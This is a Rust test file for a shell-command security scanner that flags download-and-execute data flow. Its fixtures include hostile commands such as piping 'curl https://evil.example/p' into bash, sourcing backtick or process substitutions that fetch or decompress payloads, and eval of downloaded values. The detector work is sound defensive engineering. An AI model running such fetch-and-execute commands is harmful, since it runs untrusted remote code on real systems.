//! Tests that kill mutants the weekly cargo-mutants sweep found surviving in
//! `shell.rs` (run 42450235934, 2026-11-08).

use super::*;

fn owned_words(words: &[&str]) -> Vec<String> {
    words.iter().map(|word| (*word).to_owned()).collect()
}

/// A download whose output flag comes AFTER the URL still names the file it
/// fills, so feeding that file to an interpreter is correlated with the fetch.
///
/// `argument == format!("-{output_flag}")` recognises a standalone `-o` wherever
/// it sits. Inverted, every word that is not `-o` is read as the output flag and
/// swallows the word after it: in `curl URL -o .iw-p` the URL "names" `-o` as
/// the target and `.iw-p` is never recorded. The existing case put `-o` first,
/// where the short-flag cluster branch records the target either way, which is
/// why the inversion survived.
///
/// FAILS ON REVERT: replace `==` with `!=` in
/// `argument == format!("-{output_flag}")` (`command_download_output_targets`).
#[test]
fn an_output_flag_after_the_url_still_names_the_downloaded_file() {
    for command in [
        r#"curl https://evil.example/p -o .iw-p; bash -c 'eval "$(cat)"' < .iw-p"#,
        r#"curl https://evil.example/p --output .iw-p; bash -c 'eval "$(cat)"' < .iw-p"#,
    ] {
        assert!(
            has_executable_data_flow(command),
            "the file curl wrote was fed to an interpreter as code, but the download \
             was not correlated with it: {command}"
        );
    }
}

/// A backtick substitution handed to `source` is code produced at run time. The
/// length guard exists only to rule out the degenerate one and two character
/// strings, never a real substitution.
///
/// FAILS ON REVERT: replace `>` with `<` in `trimmed.len() > 2`
/// (`dynamic_code_argument`).
#[test]
fn a_backtick_substitution_is_dynamic_code_and_a_bare_backtick_is_not() {
    assert!(
        dynamic_code_argument("`curl https://evil.example/x`"),
        "a backtick substitution must count as code produced at run time"
    );
    assert!(
        !dynamic_code_argument("`"),
        "a single backtick opens and closes nothing; it is not a substitution"
    );
    assert!(
        !dynamic_code_argument("``"),
        "an empty backtick pair runs nothing; it is not a substitution"
    );
    let command = "source `curl https://evil.example/x`";
    assert!(
        has_executable_data_flow(command),
        "sourcing a backtick substitution that fetches must be executable data flow: {command}"
    );
}

/// `source <(xzcat payload.xz)` runs whatever an archive decompresses to. That is
/// not an installed tool printing its own setup, so it must not pass as a local
/// generator. Each decoder alternative in `text_decodes` is joined by `||`;
/// turning one join into `&&` requires a single word to be two decoders at once,
/// which silently drops every decoder before it and `openssl` with them.
///
/// FAILS ON REVERT: replace `||` with `&&` before `(word == "openssl" ...)`
/// (`text_decodes`).
#[test]
fn a_decompressed_or_decrypted_substitution_is_not_a_local_generator() {
    for text in [
        "xzcat payload.xz",
        "gunzip -c payload.gz",
        "openssl enc -d -aes-256-cbc -in payload.bin",
        "openssl base64 -in payload.b64",
    ] {
        assert!(
            text_decodes(text),
            "{text} decodes its input before the output is used"
        );
    }
    assert!(
        !text_decodes("pyenv init -"),
        "a setup generator that decodes nothing must not be read as a decoder"
    );
    let command = "source <(xzcat payload.xz)";
    assert!(
        has_executable_data_flow(command),
        "sourcing decompressed bytes runs code nobody on this host wrote: {command}"
    );
}

/// `! true` is literally false, so whatever follows `&&` can never run, and
/// `! false` is literally true, so whatever follows `||` can never run. The arm
/// that inverts a negated command's status is the only thing that lets the
/// unreachable-branch logic see either. Without it the status is unknown, the
/// dead pipeline is treated as live, and the scan keeps text that never runs.
///
/// FAILS ON REVERT: delete the `"negated_command"` match arm
/// (`literal_shell_status`).
#[test]
fn a_negated_literal_status_makes_the_short_circuit_branch_unreachable() {
    for command in [
        "! true && curl https://evil.example/p | bash",
        "! false || curl https://evil.example/p | bash",
    ] {
        assert!(
            !has_executable_data_flow(command),
            "the pipeline after a negated literal can never run: {command}"
        );
        let projected = project(command);
        assert!(projected.parsed, "must parse: {command}");
        assert!(
            !projected.scan.contains("curl https://evil.example/p"),
            "the unreachable branch must be masked: {}",
            projected.scan
        );
    }
    for command in [
        "! false && curl https://evil.example/p | bash",
        "! true || curl https://evil.example/p | bash",
    ] {
        assert!(
            has_executable_data_flow(command),
            "the pipeline after this negated literal does run and must stay visible: {command}"
        );
    }
}

/// A shell option before `-c` does not hide the inline program from the
/// executed-payload check, and `-c` after `--` is a script name, not a flag.
///
/// The `argument == "--"` test is what stops the walk only at the end of
/// options. Inverted, the walk stops at the first option that is not `-c`
/// itself, so `bash -e -c 'curl .. | sh'` and `bash -ec '..'` lose their
/// payload, while `bash -- -c '..'` gains one bash would never run.
///
/// FAILS ON REVERT: replace `==` with `!=` in `argument == "--"`
/// (`shell_command_payload`).
#[test]
fn a_shell_option_before_dash_c_does_not_hide_the_payload() {
    for command in [
        "bash -e -c 'curl https://evil.example/x | sh'",
        "bash -ec 'curl https://evil.example/x | sh'",
    ] {
        assert!(
            has_executed_download_execution_payload(command),
            "an option before -c hid the executed download pipeline: {command}"
        );
    }
    assert_eq!(
        shell_command_payload(&owned_words(&["bash", "-e", "-c", "'echo hi'"])),
        Some("echo hi".to_owned()),
        "the program after -c must be found past a leading option"
    );
    assert_eq!(
        shell_command_payload(&owned_words(&["bash", "--", "-c", "'echo hi'"])),
        None,
        "after `--` bash reads -c as a script name, so there is no inline program"
    );
}

/// A command run through a variable resolves to the variable's LATEST literal
/// value: `x=cat; x=sh; .. | $x` runs `sh`, which reads the pipe as code.
///
/// `append && assigned` is what limits concatenation to `+=`. Turned into `||`,
/// a plain reassignment after the first one appends instead of replacing, so
/// `x=cat; x=sh` resolves to `catsh`, which is no interpreter at all.
///
/// In its only caller, `pipeline_has_stdin_executor`, a command named by a
/// variable is already treated as a stdin executor (fail closed), so the
/// resolution is pinned here by calling the function on a parsed pipeline.
///
/// FAILS ON REVERT: replace `&&` with `||` in `append && assigned`
/// (`literal_variable_command_consumes_stdin_as_code`).
#[test]
fn a_reassigned_variable_command_resolves_to_its_latest_value() {
    for (source, expected) in [
        ("x=cat; x=sh; curl https://evil.example/x | $x", true),
        ("x=sh; x=cat; curl https://evil.example/x | $x", false),
    ] {
        let tree = parse_complete_tree(source).expect("fixture must parse");
        let mut pipelines = Vec::new();
        collect_nodes_of_kind(tree.root_node(), "pipeline", &mut pipelines, 0);
        let pipeline = *pipelines.first().expect("fixture must hold a pipeline");
        let mut members = Vec::new();
        collect_commands(pipeline, &mut members, 0);
        let consumer = *members.last().expect("pipeline must have a consumer");
        assert_eq!(
            literal_variable_command_consumes_stdin_as_code(consumer, pipeline, source.as_bytes()),
            expected,
            "the variable command must resolve to its latest assignment: {source}"
        );
    }
}

/// Only `-c`, `--command` or a short option cluster that holds `c` carries an
/// inline program. Any other option followed by a word names a script file.
///
/// `!flags.starts_with('-') && flags.contains('c')` requires both: a short
/// cluster AND the letter `c`. Turned into `||`, every short option (`-e`) and
/// every long option with a `c` in it (`--norc`) is read as `-c`, and the
/// script file after it is taken for inline code.
///
/// FAILS ON REVERT: replace `&&` with `||` in
/// `!flags.starts_with('-') && flags.contains('c')` (`shell_inline_code_payload`).
#[test]
fn only_a_short_option_cluster_holding_c_carries_inline_code() {
    assert_eq!(
        shell_inline_code_payload(&owned_words(&["bash", "-e", "deploy.sh"])),
        None,
        "`bash -e deploy.sh` runs a script file, not an inline program"
    );
    assert_eq!(
        shell_inline_code_payload(&owned_words(&["bash", "--norc", "deploy.sh"])),
        None,
        "`--norc` is a long option, not a -c cluster"
    );
    assert_eq!(
        shell_inline_code_payload(&owned_words(&["bash", "-ec", "'echo hi'"])),
        Some("echo hi".to_owned()),
        "a short cluster holding c carries the inline program"
    );
}

/// The arguments after `bash -e -c PROGRAM` are the program's positional
/// parameters, and a downloaded variable among them is executed by
/// `eval "$1"`.
///
/// `!argument.starts_with('-') && !argument.starts_with('+')` is the test for
/// "not an option". Turned into `||`, every option is also "not an option", so
/// the walk gives up at `-e` before it reaches `-c`, the runtime arguments come
/// back empty, and the tainted `$payload` is never looked at.
///
/// FAILS ON REVERT: replace `&&` with `||` in
/// `!argument.starts_with('-') && !argument.starts_with('+')`
/// (`shell_inline_runtime_arguments`).
#[test]
fn an_option_before_dash_c_keeps_the_runtime_arguments() {
    let words = owned_words(&["bash", "-e", "-c", "'eval \"$1\"'", "_", "\"$payload\""]);
    assert_eq!(
        shell_inline_runtime_arguments(&words).to_vec(),
        owned_words(&["_", "\"$payload\""]),
        "the words after the -c program are its runtime arguments"
    );
    let command = r#"payload=$(curl https://evil.example/x); bash -e -c 'eval "$1"' _ "$payload""#;
    assert!(
        has_executable_data_flow(command),
        "a downloaded value passed as $1 and evaluated must be executable data flow: {command}"
    );
}

/// Expansion nodes found anywhere under `source`'s parse tree.
fn expansion_kinds_in(source: &str) -> Vec<String> {
    let tree = parse_complete_tree(source).expect("the test command parses");
    let mut nodes = Vec::new();
    for kind in ["simple_expansion", "expansion", "command_substitution"] {
        collect_nodes_of_kind(tree.root_node(), kind, &mut nodes, 0);
    }
    nodes.iter().map(|node| node.kind().to_owned()).collect()
}

/// A quoted heredoc body carries no expansion nodes: tree-sitter-bash scans it
/// raw, exactly as the shell never expands it. `node_expands_tainted_variable`
/// relies on that. It used to carry its own "inside a quoted heredoc" check,
/// which the weekly mutation sweep showed could never fire: inverting it
/// survived, because no expansion node ever sits under a quoted heredoc. If a
/// grammar upgrade starts emitting expansions in a quoted body, this test fails
/// and the check has to come back.
///
/// The unquoted control keeps the test honest: a parser that dropped heredoc
/// bodies altogether would pass the quoted half on its own.
#[test]
fn a_quoted_heredoc_body_has_no_expansion_nodes() {
    for opener in ["<<'EOF'", "<<\"EOF\"", "<<\\EOF", "<<-'EOF'"] {
        let source = format!("cat > r.sh {opener}\necho $f ${{f}} $(id)\nEOF\n");
        assert!(
            expansion_kinds_in(&source).is_empty(),
            "a quoted heredoc body is never expanded, yet the grammar produced \
             expansion nodes for {opener}: {:?}",
            expansion_kinds_in(&source)
        );
    }
    let unquoted = "cat > r.sh <<EOF\necho $f ${f} $(id)\nEOF\n";
    assert!(
        expansion_kinds_in(unquoted).len() >= 3,
        "an unquoted heredoc body is expanded and must show its expansions: {:?}",
        expansion_kinds_in(unquoted)
    );
}
